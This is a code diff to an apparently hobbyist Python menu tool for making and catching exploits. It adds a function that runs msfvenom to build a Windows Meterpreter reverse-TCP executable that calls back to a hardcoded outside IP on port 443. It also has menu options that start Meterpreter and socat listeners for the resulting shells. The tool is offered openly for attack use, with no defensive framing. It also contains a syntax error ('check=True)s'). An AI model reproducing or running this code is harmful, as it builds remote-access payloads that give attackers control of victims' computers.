@@ -126,23 +126,113 @@ def exitcowsay(exitmessagespace1, exitmessage1, exitmessagespace2):
     
     print(exitcow_art)
 
-# ---------------------------------------menus----------------------------------------
+# ---------------------------------------centering menu | clear screen----------------------------------------
 
-def show_menu():
+def print_centered(text):
     terminal_width = os.get_terminal_size().columns
-    menu_width = terminal_width - 5  # Adjust for padding
+    centered_text = text.center(terminal_width)
+    print(centered_text)
 
-    menu_options = [ 
-	" " * (terminal_width // 5 - 11) + "[1] Start Meterpreter Listener(for self extractable img / pdf exploits)",
-    " " * (terminal_width // 5 - 11) + "[2] Start Socat Listener(for bat file exploits)",
-	" " * (terminal_width // 5 - 11) + "[3] Exit",
-    ]
-    
-    for option in menu_options:
-        print(f"{option:<{menu_width}}")  # Fill width with options
+def print_shifted_left(text, padding=10):
+    shifted_text = " " * padding + text
+    print(shifted_text)
+
+def clear_screen():
+    os.system('clear')
+
+# ---------------------------------------menu----------------------------------------
+
+def main_menu():
+    print_centered("Main Menu")
+    print_shifted_left("[1] Make Exploit")
+    print_shifted_left("[2] Listener For Exploits")
+    print_shifted_left("[3] Exit")
     print()
     print("Tip: Select an option by entering the corresponding number!")
     print()
+    
+    choice = input("Select an option: ")
+    
+    if choice == '1':
+        clear_screen()
+        print_fade_banner()
+        make_exploits_menu()  
+    elif choice == '2':
+        clear_screen()
+        print_fade_banner()
+        listener_exploits_menu()  
+    elif choice == '3':
+        exit_program()  # Exit the tool
+    else:
+        error_message()
+    input("Press Enter to continue...""\n")
+    clear_screen()
+    main()
+
+def make_exploits_menu():
+    print_centered("Make Exploits Menu")
+    print_shifted_left("[1] .EXE Exploit")
+    print_shifted_left("[2] .HTA Exploits")
+    print_shifted_left("[3] Go Back")
+    print()
+    print("Tip: Select an option by entering the corresponding number!")
+    print()
+    
+    choice = input("Select an option: ")
+
+    if choice == '1':
+        clear_screen()
+        print_fade_banner()
+        make_exe_exploits()
+        make_exploits_menu()
+    elif choice == '2':
+        clear_screen()
+        print_fade_banner()
+        files = os.listdir('.')
+        print(f"Files in Directory: {files}")
+        make_exploits_menu()
+    elif choice == '3':
+        clear_screen()
+        print_fade_banner()
+        main_menu()
+    else:
+        error_message()
+    input("Press Enter to continue...""\n")
+    clear_screen()
+    print_fade_banner()
+    make_exploits_menu()
+
+def listener_exploits_menu():
+    print_centered("Listener Exploits Menu")
+    print_shifted_left("[1] Meterpreter Listener for .exe Exploits")
+    print_shifted_left("[2] Socat Listener for .BAT Exploits")
+    print_shifted_left("[3] Go Back")
+    print()
+    print("Tip: Select an option by entering the corresponding number!")
+    print()
+    
+    choice = input("Select an option: ")
+
+    if choice == '1':
+        clear_screen()
+        print_fade_banner()
+        start_meterpreter_listener()
+    elif choice == '2':
+        clear_screen()
+        print_fade_banner()
+        start_Socat_listener()
+    elif choice == '3':
+        clear_screen()
+        print_fade_banner()
+        main_menu()
+    else:
+        error_message()
+    input("Press Enter to continue...""\n")
+    clear_screen()
+    print_fade_banner()
+    listener_exploits_menu()
+
+# ---------------------------------------listener menu options----------------------------------------
 
 def start_meterpreter_listener():
     try:
@@ -168,9 +258,9 @@ def start_Socat_listener():
         print("Starting Socat Listener")
         subprocess.run([
             "socat", 
-            "-d", 
-            "-d", 
-            "OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork", 
+            "-d",
+            "-d",
+            "OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork",
             "STDOUT"
         ], check=True)
     except subprocess.CalledProcessError as e:
@@ -178,53 +268,70 @@ def start_Socat_listener():
     except FileNotFoundError:
         print("socat is not installed. Please install socat and try again.")
 
+# ---------------------------------------make exploits menu options----------------------------------------
+
+def make_exe_exploits():
+    try:
+        subprocess.run([
+            "msfvenom", 
+            "-p",
+            "windows/meterpreter/reverse_tcp",
+            "LHOST=194.195.114.92",  # No changes here, but can use f-string if needed
+            "LPORT=443",              # Same as above
+            "-f",
+            "exe",
+            "-o",
+            "exploit.exe"
+        ], check=True)s
+        print("Payload created successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred while creating the payload: {e}")
+    except FileNotFoundError:
+        print("msfvenom is not installed. Please install msfvenom and try again.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+
+# ---------------------------------------Errors | Exit program----------------------------------------
+
+def error_message():
+    messagespace0 = ("")          
+    message1 = ("                Are you dumb bruh? Can't you see the available option?                ")
+    messagespace1 = ("")
+    message2 = ("  NNNNNNNN        NNNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
+    message3 = ("  N:::::::N       N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
+    message4 = ("  N::::::::N      N::::::N OO:::::::::::::OO  OO:::::::::::::OO B::::::BBBBBB:::::B   ")
+    message5 = ("  N:::::::::N     N::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::B     B:::::B  ")
+    message6 = ("  N::::::::::N    N::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
+    message7 = ("  N:::::::::::N   N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
+    message8 = ("  N:::::::N::::N  N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
+    message9 = ("  N::::::N N::::N N::::::NO:::::O     O:::::OO:::::O     O:::::O  B:::::::::::::BB    ")
+    message10 = ("  N::::::N  N::::N:::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
+    message11 = ("  N::::::N   N:::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
+    message12 = ("  N::::::N    N::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
+    message13 = ("  N::::::N     N:::::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
+    message14 = ("  N::::::N      N::::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::BBBBBB::::::B  ")
+    message15 = ("  N::::::N       N:::::::N OO:::::::::::::OO  OO:::::::::::::OO B:::::::::::::::::B   ")
+    message16 = ("  N::::::N        N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
+    message17 = ("  NNNNNNNN         NNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
+    messagespace2 = ("")
+    print()
+    cowsay(messagespace0, message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2)
+
+def exit_program():
+    exitmessagespace1 = ("")
+    exitmessage1 = ("                                  .....EXITING.....                                    ")
+    exitmessagespace2 = ("")
+    print()
+    exitcowsay(exitmessagespace1, exitmessage1, exitmessagespace2)
+    print()
+    exit()
+
 # ---------------------------------------Main Functions----------------------------------------
 
 def main():
+    clear_screen()
     print_fade_banner()  # Show fade banner on startup
-    # print_rainbow_banner()  # Show rainbow banner on startup
-    while True:
-        show_menu()  # Display the menu
-        choice = input("Please select an option [1-3]: ")
-
-        if choice == '1':
-            start_meterpreter_listener()
-        elif choice == '2':
-            start_Socat_listener()
-        elif choice == '3':
-            exitmessagespace1 = ("")
-            exitmessage1 = ("                                  .....EXITING.....                                    ")
-            exitmessagespace2 = ("")
-            print()
-            exitcowsay(exitmessagespace1, exitmessage1, exitmessagespace2)
-            print()
-            break
-        else:
-            messagespace0 = ("")          
-            message1 = ("                Are you dumb bruh? Can't you see the available option?                ")
-            messagespace1 = ("")
-            message2 = ("  NNNNNNNN        NNNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
-            message3 = ("  N:::::::N       N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
-            message4 = ("  N::::::::N      N::::::N OO:::::::::::::OO  OO:::::::::::::OO B::::::BBBBBB:::::B   ")
-            message5 = ("  N:::::::::N     N::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::B     B:::::B  ")
-            message6 = ("  N::::::::::N    N::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
-            message7 = ("  N:::::::::::N   N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
-            message8 = ("  N:::::::N::::N  N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
-            message9 = ("  N::::::N N::::N N::::::NO:::::O     O:::::OO:::::O     O:::::O  B:::::::::::::BB    ")
-            message10 = ("  N::::::N  N::::N:::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
-            message11 = ("  N::::::N   N:::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
-            message12 = ("  N::::::N    N::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
-            message13 = ("  N::::::N     N:::::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
-            message14 = ("  N::::::N      N::::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::BBBBBB::::::B  ")
-            message15 = ("  N::::::N       N:::::::N OO:::::::::::::OO  OO:::::::::::::OO B:::::::::::::::::B   ")
-            message16 = ("  N::::::N        N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
-            message17 = ("  NNNNNNNN         NNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
-            messagespace2 = ("")
-            print()
-            cowsay(messagespace0, message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2)
-
-        input("Press Enter to continue...""\n")
-        print_fade_banner()
+    main_menu()
 
 if __name__ == "__main__":
     main()
